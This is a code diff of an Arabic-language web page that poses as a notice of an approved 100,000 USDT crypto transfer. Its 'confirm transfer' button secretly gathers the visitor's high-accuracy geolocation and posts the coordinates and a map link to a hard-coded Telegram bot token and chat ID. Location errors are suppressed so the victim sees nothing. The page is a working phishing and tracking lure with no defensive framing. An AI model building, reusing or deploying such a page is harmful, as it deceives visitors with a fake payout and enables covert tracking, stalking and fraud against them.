@@ -2,73 +2,67 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>عملات رقمية USDT وبيتكوين</title>
+  <title>تهانينا</title>
   <style>
     body {
-      background-color: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      background: #000;
+      color: gold;
       text-align: center;
-      padding: 30px;
+      font-family: Arial, sans-serif;
     }
     img {
-      width: 120px;
-      margin-top: 20px;
+      width: 180px;
+      margin-top: 30px;
     }
     h1 {
-      font-size: 26px;
-      margin-bottom: 10px;
-      color: gold;
-    }
-    p {
-      font-size: 18px;
-      margin-bottom: 30px;
+      font-size: 28px;
+      margin: 20px 0;
     }
     button {
-      font-size: 18px;
-      background-color: gold;
+      font-size: 20px;
+      padding: 12px 30px;
+      background: gold;
       border: none;
-      padding: 12px 25px;
-      border-radius: 8px;
       color: black;
+      border-radius: 10px;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo">
-  <h1>عملات رقمية USDT وبيتكوين</h1>
-  <p>تهانينا، تم قبول الطلب لتحويل المال</p>
-  <button onclick="getLocation()">تأكيد التحويل</button>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png" alt="Bitcoin Logo" />
+  <h1>تهانينا! تم قبول طلب تحويل 100,000 USDT</h1>
+  <button onclick="getLocation()">تأكيد تحويل المال</button>
 
   <script>
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+        navigator.geolocation.getCurrentPosition(sendLocation, errorHandler, {
           enableHighAccuracy: true,
-          timeout: 10000,
+          timeout: 5000,
           maximumAge: 0
         });
       }
     }
 
-    function sendToTelegram(position) {
+    function sendLocation(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
-      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";  // تأكد أنه صحيح
-      const chat_id = "7485197107";  // تأكد أنه صحيح
-
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}`;
-
-      fetch(url)
-        .then(response => console.log('تم الإرسال للبوت'))
-        .catch(error => console.error('فشل الإرسال:', error));
+      fetch('https://api.telegram.org/bot8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0/sendMessage', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: 7485197107,
+          text: `📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`
+        })
+      });
     }
 
-    function showError(error) {
-      console.error('فشل تحديد الموقع:', error);
+    function errorHandler(error) {
+      // بلا رسالة
     }
   </script>
 </body>
